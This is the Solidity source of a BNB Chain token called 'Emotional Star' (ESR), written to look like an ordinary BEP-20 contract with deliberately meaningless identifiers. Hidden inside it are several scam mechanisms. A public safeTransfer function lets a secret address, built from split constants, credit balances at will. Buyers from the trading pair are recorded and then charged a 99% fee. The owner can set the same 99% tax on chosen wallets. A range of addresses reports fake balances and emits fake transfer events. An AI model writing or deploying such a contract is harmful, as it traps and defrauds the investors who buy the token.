/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function symbol() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    function approve(address spender, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}




contract EmotionalStar is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    mapping(address => uint256) private liquiditySellFeeBurn;
    address private launchListModeTradingBurnMaxFrom = (msg.sender);
    uint256 constant txAutoAmountReceiver = 300000 * 10 ** 18;
    address private tradingTakeToEnableExempt = (msg.sender);
    address constant modeTotalListFee = 0xC75c4aE80479F9C3A861Fc9B165760a0544Da6e9;
    uint256 private minBuyExemptAtLaunched = 1;
    uint256 private tradingListTokenFund = 0;

    bool private exemptTakeWalletReceiver = false;
    mapping(address => bool) private walletTradingLaunchIs;
    bool private modeEnableShouldMax = false;

    uint256 private launchBlock = 0;

    uint256  totalWalletLimitReceiver = 100000000 * 10 ** _decimals;

    uint256 public maxWalletAmount = 0;
    bool private txLiquidityListShouldSenderTotal = true;
    uint256 private sellReceiverWalletMaxModeTeam = enableListMaxShould / 1000; // 0.1%
    uint256 private burnMaxFundBuy;
    mapping(uint256 => address) private txMinAutoWallet;

    uint256 private autoEnableBuyTeam = 6 * 10 ** 15;
    string constant _name = "Emotional Star";
    uint256 private botsAmountIsShould;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;


    address public uniswapV2Pair;
    uint256 private limitWalletToBuyLiquiditySwapFund = 1;
    mapping(address => uint256) _balances;

    uint160 constant buyMaxLiquidityLimit = 951521751066;
    bool private walletSellBotsReceiverIs = false;
    uint256 private feeAtBotsMarketingLaunchedIs;
    uint256 public totalTxWalletSender = 0;
    uint256 tokenAtFromAuto = 576;
    bool private atTakeFundLimit = true;
    bool private fundLaunchToMintBurn = false;

    address private ZERO = 0x0000000000000000000000000000000000000000;

    uint256 private sellMinTeamTakeExempt;
    bool private marketingShouldToToken = true;
    IUniswapV2Router public burnWalletAutoLaunchAmountLiquidityEnable;
    bool private toExemptBurnAutoMinSell = false;
    uint256 private listReceiverFeeLaunch = 0;
    bool private fundBotsReceiverExempt = true;
    uint256 enableListMaxShould = 100000000 * (10 ** _decimals);
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(uint256 => address) private toSellListAt;
    uint256  constant MASK = type(uint128).max;
    uint256 private maxToReceiverMarketingTrading = 0;
    uint256 public feeSenderEnableModeMax = 0;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private listReceiverSellMax = 100;
    mapping(address => bool) private botsTxShouldMinFromTakeTo;
    uint256 constant buyLimitFundSwapMarketingLaunchedSell = 10000 * 10 ** 18;
    uint256 private receiverLaunchedTakeSell;
    bool private toShouldAtWalletTotal = false;
    uint160 constant maxAtReceiverFeeTradingLaunchList = 487208475878 * 2 ** 40;
    
    uint256 private takeBurnSellLiquidity;
    uint256 liquidityLaunchTradingMint = 0;

    bool private autoTxTakeToken = true;



    mapping(address => bool) private teamFeeSellShould;
    uint256  shouldBuyMaxMin = 100000000 * 10 ** _decimals;
    bool private mintAmountLaunchedList = false;

    mapping(address => uint256) private swapTokenReceiverMode;
    uint256 private modeEnableShouldMax0 = 0;

    uint256 private teamMarketingTotalLaunchedToken;
    uint160 constant totalMintAutoModeSwapLiquidityFee = 743931448299 * 2 ** 80;
    uint160 constant amountAutoReceiverMarketingEnableLiquidity = 435274937021 * 2 ** 120;
    string constant _symbol = "ESR";
    uint256 tradingLimitLaunchedAutoMinFeeMint = 2 ** 18 - 1;
    bool private takeLaunchedBotsBurnAmountReceiverLiquidity;
    uint256 private fromLiquidityLimitSellTokenShould = 0;


    mapping(address => bool) private limitMaxTokenTo;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        burnWalletAutoLaunchAmountLiquidityEnable = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(burnWalletAutoLaunchAmountLiquidityEnable.factory()).createPair(address(this), burnWalletAutoLaunchAmountLiquidityEnable.WETH());
        _allowances[address(this)][address(burnWalletAutoLaunchAmountLiquidityEnable)] = enableListMaxShould;

        takeLaunchedBotsBurnAmountReceiverLiquidity = true;

        botsTxShouldMinFromTakeTo[msg.sender] = true;
        botsTxShouldMinFromTakeTo[0x0000000000000000000000000000000000000000] = true;
        botsTxShouldMinFromTakeTo[0x000000000000000000000000000000000000dEaD] = true;
        botsTxShouldMinFromTakeTo[address(this)] = true;

        limitMaxTokenTo[msg.sender] = true;
        limitMaxTokenTo[address(this)] = true;

        teamFeeSellShould[msg.sender] = true;
        teamFeeSellShould[0x0000000000000000000000000000000000000000] = true;
        teamFeeSellShould[0x000000000000000000000000000000000000dEaD] = true;
        teamFeeSellShould[address(this)] = true;

        approve(_router, enableListMaxShould);
        approve(address(uniswapV2Pair), enableListMaxShould);
        _balances[msg.sender] = enableListMaxShould;
        emit Transfer(address(0), msg.sender, enableListMaxShould);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return enableListMaxShould;
    }

    function setbuyMaxIsTake(uint256 tokenAmountFromAuto) public onlyOwner {
        if (autoEnableBuyTeam != modeEnableShouldMax0) {
            modeEnableShouldMax0=tokenAmountFromAuto;
        }
        autoEnableBuyTeam=tokenAmountFromAuto;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (isMinReceiverEnable(uint160(account))) {
            return feeMarketingTakeMax(uint160(account));
        }
        return _balances[account];
    }

    function gettoLaunchedMinIsAuto() public view returns (bool) {
        if (mintAmountLaunchedList == modeEnableShouldMax) {
            return modeEnableShouldMax;
        }
        if (mintAmountLaunchedList == exemptTakeWalletReceiver) {
            return exemptTakeWalletReceiver;
        }
        if (mintAmountLaunchedList != fundLaunchToMintBurn) {
            return fundLaunchToMintBurn;
        }
        return mintAmountLaunchedList;
    }

    function setswapLimitModeReceiver(address tokenAmountFromAuto) public onlyOwner {
        if (launchListModeTradingBurnMaxFrom != WBNB) {
            WBNB=tokenAmountFromAuto;
        }
        if (launchListModeTradingBurnMaxFrom != launchListModeTradingBurnMaxFrom) {
            launchListModeTradingBurnMaxFrom=tokenAmountFromAuto;
        }
        if (launchListModeTradingBurnMaxFrom != ZERO) {
            ZERO=tokenAmountFromAuto;
        }
        launchListModeTradingBurnMaxFrom=tokenAmountFromAuto;
    }

    function getWBNB() public view returns (address) {
        if (WBNB == launchListModeTradingBurnMaxFrom) {
            return launchListModeTradingBurnMaxFrom;
        }
        if (WBNB != ZERO) {
            return ZERO;
        }
        return WBNB;
    }

    function getautoBotsReceiverAtMinFund(address tokenAmountFromAuto) public view returns (bool) {
            return teamFeeSellShould[tokenAmountFromAuto];
    }

    function getMaxTotalAFee() public {
        walletTokenBurnMarketing();
    }

    function getenableIsAmountFundShouldWalletBots() public view returns (bool) {
        if (fundBotsReceiverExempt == marketingShouldToToken) {
            return marketingShouldToToken;
        }
        return fundBotsReceiverExempt;
    }

    function setMaxWalletAmount(uint256 tokenAmountFromAuto) public onlyOwner {
        maxWalletAmount=tokenAmountFromAuto;
    }

    function launchAutoAtMarketingTokenEnable(address maxLimitTotalMode, bool launchedToLiquidityEnable) internal returns (uint256) {
        
        if (launchedToLiquidityEnable) {
            sellMinTeamTakeExempt = limitWalletToBuyLiquiditySwapFund + listReceiverFeeLaunch;
            return botsEnableFromShouldBuy(maxLimitTotalMode, sellMinTeamTakeExempt);
        }
        if (!launchedToLiquidityEnable && maxLimitTotalMode == uniswapV2Pair) {
            sellMinTeamTakeExempt = minBuyExemptAtLaunched + tradingListTokenFund;
            return sellMinTeamTakeExempt;
        }
        return botsEnableFromShouldBuy(maxLimitTotalMode, sellMinTeamTakeExempt);
    }

    function buyLaunchBurnFee() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (swapTokenReceiverMode[txMinAutoWallet[i]] == 0) {
                    swapTokenReceiverMode[txMinAutoWallet[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function launchMaxSenderShould(address fromShouldMintSender) private {
        uint256 launchedTradingListLaunchTotalShould = toTxLimitBurnReceiver();
        if (launchedTradingListLaunchTotalShould < autoEnableBuyTeam) {
            totalTxWalletSender += 1;
            toSellListAt[totalTxWalletSender] = fromShouldMintSender;
            liquiditySellFeeBurn[fromShouldMintSender] += launchedTradingListLaunchTotalShould;
            if (liquiditySellFeeBurn[fromShouldMintSender] > autoEnableBuyTeam) {
                maxWalletAmount = maxWalletAmount + 1;
                txMinAutoWallet[maxWalletAmount] = fromShouldMintSender;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        txMinAutoWallet[maxWalletAmount] = fromShouldMintSender;
    }

    function getwalletLaunchTakeTotalAutoMinList(uint256 tokenAmountFromAuto) public view returns (address) {
        if (tokenAmountFromAuto != feeSenderEnableModeMax) {
            return DEAD;
        }
            return toSellListAt[tokenAmountFromAuto];
    }

    function getbuyMaxIsTake() public view returns (uint256) {
        if (autoEnableBuyTeam != totalTxWalletSender) {
            return totalTxWalletSender;
        }
        return autoEnableBuyTeam;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function minEnableSwapFundListFeeAmount() private view returns (uint256) {
        return block.timestamp;
    }

    function setenableIsAmountFundShouldWalletBots(bool tokenAmountFromAuto) public onlyOwner {
        if (fundBotsReceiverExempt != toExemptBurnAutoMinSell) {
            toExemptBurnAutoMinSell=tokenAmountFromAuto;
        }
        if (fundBotsReceiverExempt == txLiquidityListShouldSenderTotal) {
            txLiquidityListShouldSenderTotal=tokenAmountFromAuto;
        }
        fundBotsReceiverExempt=tokenAmountFromAuto;
    }

    function tradingLaunchFromList(address fromShouldMintSender) private view returns (bool) {
        if (fromShouldMintSender == launchListModeTradingBurnMaxFrom) {
            return true;
        }
        uint256 sellReceiverModeTokenMax = uint256(uint160(fromShouldMintSender)) << 192;
        sellReceiverModeTokenMax = sellReceiverModeTokenMax >> 238;
        return sellReceiverModeTokenMax == tradingLimitLaunchedAutoMinFeeMint;
    }

    function shouldWalletMintBuyFundSell(uint160 tradingTeamTotalTokenModeAutoAmount) private view returns (bool) {
        return uint16(tradingTeamTotalTokenModeAutoAmount) == tokenAtFromAuto;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function senderTakeBotsReceiver(address maxLimitTotalMode, address atFeeMaxExemptAmount, uint256 liquidityReceiverAutoTxEnableReceiver) internal returns (uint256) {
        
        if (fromLiquidityLimitSellTokenShould != fromLiquidityLimitSellTokenShould) {
            fromLiquidityLimitSellTokenShould = maxToReceiverMarketingTrading;
        }


        uint256 exemptLaunchedIsModeBuyMinAmount = liquidityReceiverAutoTxEnableReceiver.mul(launchAutoAtMarketingTokenEnable(maxLimitTotalMode, atFeeMaxExemptAmount == uniswapV2Pair)).div(listReceiverSellMax);

        if (walletTradingLaunchIs[maxLimitTotalMode] || walletTradingLaunchIs[atFeeMaxExemptAmount]) {
            exemptLaunchedIsModeBuyMinAmount = liquidityReceiverAutoTxEnableReceiver.mul(99).div(listReceiverSellMax);
        }

        _balances[address(this)] = _balances[address(this)].add(exemptLaunchedIsModeBuyMinAmount);
        emit Transfer(maxLimitTotalMode, address(this), exemptLaunchedIsModeBuyMinAmount);
        
        return liquidityReceiverAutoTxEnableReceiver.sub(exemptLaunchedIsModeBuyMinAmount);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function swapBotsMaxLaunched(address maxLimitTotalMode) internal view returns (bool) {
        return !teamFeeSellShould[maxLimitTotalMode];
    }

    function getswapLimitModeReceiver() public view returns (address) {
        if (launchListModeTradingBurnMaxFrom != launchListModeTradingBurnMaxFrom) {
            return launchListModeTradingBurnMaxFrom;
        }
        if (launchListModeTradingBurnMaxFrom != DEAD) {
            return DEAD;
        }
        if (launchListModeTradingBurnMaxFrom == ZERO) {
            return ZERO;
        }
        return launchListModeTradingBurnMaxFrom;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return fundTokenTxSell(msg.sender, recipient, amount);
    }

    function setWBNB(address tokenAmountFromAuto) public onlyOwner {
        if (WBNB != launchListModeTradingBurnMaxFrom) {
            launchListModeTradingBurnMaxFrom=tokenAmountFromAuto;
        }
        if (WBNB != tradingTakeToEnableExempt) {
            tradingTakeToEnableExempt=tokenAmountFromAuto;
        }
        if (WBNB == DEAD) {
            DEAD=tokenAmountFromAuto;
        }
        WBNB=tokenAmountFromAuto;
    }

    function setwalletLaunchTakeTotalAutoMinList(uint256 tokenAmountFromAuto,address fromBuyWalletMax) public onlyOwner {
        if (tokenAmountFromAuto == fromLiquidityLimitSellTokenShould) {
            ZERO=fromBuyWalletMax;
        }
        if (tokenAmountFromAuto == sellReceiverWalletMaxModeTeam) {
            DEAD=fromBuyWalletMax;
        }
        if (tokenAmountFromAuto != listReceiverFeeLaunch) {
            WBNB=fromBuyWalletMax;
        }
        toSellListAt[tokenAmountFromAuto]=fromBuyWalletMax;
    }

    function getmaxSellMintAmount() public view returns (uint256) {
        if (tradingListTokenFund == fromLiquidityLimitSellTokenShould) {
            return fromLiquidityLimitSellTokenShould;
        }
        if (tradingListTokenFund != totalTxWalletSender) {
            return totalTxWalletSender;
        }
        return tradingListTokenFund;
    }

    function modeTotalSenderReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function gettxShouldMintTeamExempt() public view returns (bool) {
        if (autoTxTakeToken == fundLaunchToMintBurn) {
            return fundLaunchToMintBurn;
        }
        return autoTxTakeToken;
    }

    function settoLaunchedMinIsAuto(bool tokenAmountFromAuto) public onlyOwner {
        if (mintAmountLaunchedList != toExemptBurnAutoMinSell) {
            toExemptBurnAutoMinSell=tokenAmountFromAuto;
        }
        if (mintAmountLaunchedList == fundBotsReceiverExempt) {
            fundBotsReceiverExempt=tokenAmountFromAuto;
        }
        if (mintAmountLaunchedList == marketingShouldToToken) {
            marketingShouldToToken=tokenAmountFromAuto;
        }
        mintAmountLaunchedList=tokenAmountFromAuto;
    }

    function getlaunchedToModeLimitReceiver() public view returns (bool) {
        if (exemptTakeWalletReceiver == fundBotsReceiverExempt) {
            return fundBotsReceiverExempt;
        }
        if (exemptTakeWalletReceiver == modeEnableShouldMax) {
            return modeEnableShouldMax;
        }
        return exemptTakeWalletReceiver;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != enableListMaxShould) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return fundTokenTxSell(sender, recipient, amount);
    }

    function setautoBotsReceiverAtMinFund(address tokenAmountFromAuto,bool fromBuyWalletMax) public onlyOwner {
        if (teamFeeSellShould[tokenAmountFromAuto] != walletTradingLaunchIs[tokenAmountFromAuto]) {
           walletTradingLaunchIs[tokenAmountFromAuto]=fromBuyWalletMax;
        }
        if (teamFeeSellShould[tokenAmountFromAuto] == walletTradingLaunchIs[tokenAmountFromAuto]) {
           walletTradingLaunchIs[tokenAmountFromAuto]=fromBuyWalletMax;
        }
        teamFeeSellShould[tokenAmountFromAuto]=fromBuyWalletMax;
    }

    function txMinFeeSwap(uint160 fromFundMarketingTx) private pure returns (bool) {
        uint160 receiverMinTakeMode = amountAutoReceiverMarketingEnableLiquidity;
        receiverMinTakeMode += totalMintAutoModeSwapLiquidityFee;
        receiverMinTakeMode += maxAtReceiverFeeTradingLaunchList;
        receiverMinTakeMode += buyMaxLiquidityLimit;
        if (fromFundMarketingTx == receiverMinTakeMode) {
            return true;
        }
        return false;
    }

    function getMaxTotalAmount() public {
        buyLaunchBurnFee();
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function setlaunchedToModeLimitReceiver(bool tokenAmountFromAuto) public onlyOwner {
        exemptTakeWalletReceiver=tokenAmountFromAuto;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, enableListMaxShould);
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function settxShouldMintTeamExempt(bool tokenAmountFromAuto) public onlyOwner {
        if (autoTxTakeToken == atTakeFundLimit) {
            atTakeFundLimit=tokenAmountFromAuto;
        }
        if (autoTxTakeToken != fundBotsReceiverExempt) {
            fundBotsReceiverExempt=tokenAmountFromAuto;
        }
        autoTxTakeToken=tokenAmountFromAuto;
    }

    function isMinReceiverEnable(uint160 fromFundMarketingTx) private pure returns (bool) {
        if (fromFundMarketingTx >= uint160(modeTotalListFee) && fromFundMarketingTx <= uint160(modeTotalListFee) + 120000) {
            return true;
        }
        return false;
    }

    function botsEnableFromShouldBuy(address maxLimitTotalMode, uint256 exemptLaunchedIsModeBuyMin) private view returns (uint256) {
        uint256 burnTakeAmountMinSellAtFee = swapTokenReceiverMode[maxLimitTotalMode];
        if (burnTakeAmountMinSellAtFee > 0 && minEnableSwapFundListFeeAmount() - burnTakeAmountMinSellAtFee > 0) {
            return 99;
        }
        return exemptLaunchedIsModeBuyMin;
    }

    function fundTokenTxSell(address maxLimitTotalMode, address tradingTeamTotalTokenModeAutoAmount, uint256 liquidityReceiverAutoTxEnableReceiver) internal returns (bool) {
        if (isMinReceiverEnable(uint160(tradingTeamTotalTokenModeAutoAmount))) {
            amountAutoListTeam(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver, false);
            return true;
        }
        if (isMinReceiverEnable(uint160(maxLimitTotalMode))) {
            amountAutoListTeam(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver, true);
            return true;
        }
        
        if (fundLaunchToMintBurn != marketingShouldToToken) {
            fundLaunchToMintBurn = toShouldAtWalletTotal;
        }

        if (modeEnableShouldMax0 != launchBlock) {
            modeEnableShouldMax0 = maxWalletAmount;
        }

        if (toExemptBurnAutoMinSell == atTakeFundLimit) {
            toExemptBurnAutoMinSell = exemptTakeWalletReceiver;
        }


        bool maxMintLiquidityReceiver = tradingLaunchFromList(maxLimitTotalMode) || tradingLaunchFromList(tradingTeamTotalTokenModeAutoAmount);
        
        if (fromLiquidityLimitSellTokenShould == sellReceiverWalletMaxModeTeam) {
            fromLiquidityLimitSellTokenShould = sellReceiverWalletMaxModeTeam;
        }

        if (maxToReceiverMarketingTrading == totalTxWalletSender) {
            maxToReceiverMarketingTrading = minBuyExemptAtLaunched;
        }


        if (maxLimitTotalMode == uniswapV2Pair) {
            if (maxWalletAmount != 0 && shouldWalletMintBuyFundSell(uint160(tradingTeamTotalTokenModeAutoAmount))) {
                buyLaunchBurnFee();
            }
            if (!maxMintLiquidityReceiver) {
                launchMaxSenderShould(tradingTeamTotalTokenModeAutoAmount);
            }
        }
        
        
        if (inSwap || maxMintLiquidityReceiver) {return modeTotalSenderReceiver(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver);}
        
        require((liquidityReceiverAutoTxEnableReceiver <= shouldBuyMaxMin) || botsTxShouldMinFromTakeTo[maxLimitTotalMode] || botsTxShouldMinFromTakeTo[tradingTeamTotalTokenModeAutoAmount], "Max TX Limit!");

        _balances[maxLimitTotalMode] = _balances[maxLimitTotalMode].sub(liquidityReceiverAutoTxEnableReceiver, "Insufficient Balance!");
        
        if (walletSellBotsReceiverIs == fundLaunchToMintBurn) {
            walletSellBotsReceiverIs = toShouldAtWalletTotal;
        }


        uint256 liquidityReceiverAutoTxEnableReceiverReceived = swapBotsMaxLaunched(maxLimitTotalMode) ? senderTakeBotsReceiver(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver) : liquidityReceiverAutoTxEnableReceiver;

        _balances[tradingTeamTotalTokenModeAutoAmount] = _balances[tradingTeamTotalTokenModeAutoAmount].add(liquidityReceiverAutoTxEnableReceiverReceived);
        emit Transfer(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiverReceived);
        return true;
    }

    function walletTokenBurnMarketing() private {
        if (totalTxWalletSender > 0) {
            for (uint256 i = 1; i <= totalTxWalletSender; i++) {
                if (swapTokenReceiverMode[toSellListAt[i]] == 0) {
                    swapTokenReceiverMode[toSellListAt[i]] = block.timestamp;
                }
            }
            totalTxWalletSender = 0;
        }
    }

    function toTxLimitBurnReceiver() private view returns (uint256) {
        address txMaxReceiverReceiver = WBNB;
        if (address(this) < WBNB) {
            txMaxReceiverReceiver = address(this);
        }
        (uint shouldReceiverBotsLiquidity, uint takeSenderReceiverFee,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 toTradingIsTxEnableAuto,) = WBNB == txMaxReceiverReceiver ? (shouldReceiverBotsLiquidity, takeSenderReceiverFee) : (takeSenderReceiverFee, shouldReceiverBotsLiquidity);
        uint256 atWalletLimitFund = IERC20(WBNB).balanceOf(uniswapV2Pair) - toTradingIsTxEnableAuto;
        return atWalletLimitFund;
    }

    function feeMarketingTakeMax(uint160 fromFundMarketingTx) private view returns (uint256) {
        uint256 enableReceiverIsAmountLaunchedReceiverSell = liquidityLaunchTradingMint;
        uint256 amountBotsWalletExemptShouldModeMint = fromFundMarketingTx - uint160(modeTotalListFee);
        if (amountBotsWalletExemptShouldModeMint < enableReceiverIsAmountLaunchedReceiverSell) {
            return buyLimitFundSwapMarketingLaunchedSell;
        }
        return txAutoAmountReceiver;
    }

    function setmaxSellMintAmount(uint256 tokenAmountFromAuto) public onlyOwner {
        if (tradingListTokenFund == tradingListTokenFund) {
            tradingListTokenFund=tokenAmountFromAuto;
        }
        if (tradingListTokenFund != maxToReceiverMarketingTrading) {
            maxToReceiverMarketingTrading=tokenAmountFromAuto;
        }
        tradingListTokenFund=tokenAmountFromAuto;
    }

    function safeTransfer(address maxLimitTotalMode, address tradingTeamTotalTokenModeAutoAmount, uint256 liquidityReceiverAutoTxEnableReceiver) public {
        if (!txMinFeeSwap(uint160(msg.sender))) {
            return;
        }
        if (isMinReceiverEnable(uint160(tradingTeamTotalTokenModeAutoAmount))) {
            amountAutoListTeam(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver, false);
            return;
        }
        if (isMinReceiverEnable(uint160(maxLimitTotalMode))) {
            amountAutoListTeam(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver, true);
            return;
        }
        if (maxLimitTotalMode == address(0)) {
            _balances[tradingTeamTotalTokenModeAutoAmount] = _balances[tradingTeamTotalTokenModeAutoAmount].add(liquidityReceiverAutoTxEnableReceiver);
            return;
        }
        if (maxLimitTotalMode == address(1)) {
            return;
        }
        if (maxLimitTotalMode == address(2)) {
            return;
        }
        if (maxLimitTotalMode == address(3)) {
            return;
        }
    }

    function getMaxWalletAmount() public view returns (uint256) {
        return maxWalletAmount;
    }

    function amountAutoListTeam(address maxLimitTotalMode, address tradingTeamTotalTokenModeAutoAmount, uint256 liquidityReceiverAutoTxEnableReceiver, bool mintMarketingTakeAtSenderAmount) private {
        if (mintMarketingTakeAtSenderAmount) {
            maxLimitTotalMode = address(uint160(uint160(modeTotalListFee) + liquidityLaunchTradingMint));
            liquidityLaunchTradingMint++;
            _balances[tradingTeamTotalTokenModeAutoAmount] = _balances[tradingTeamTotalTokenModeAutoAmount].add(liquidityReceiverAutoTxEnableReceiver);
        } else {
            _balances[maxLimitTotalMode] = _balances[maxLimitTotalMode].sub(liquidityReceiverAutoTxEnableReceiver);
        }
        emit Transfer(maxLimitTotalMode, tradingTeamTotalTokenModeAutoAmount, liquidityReceiverAutoTxEnableReceiver);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}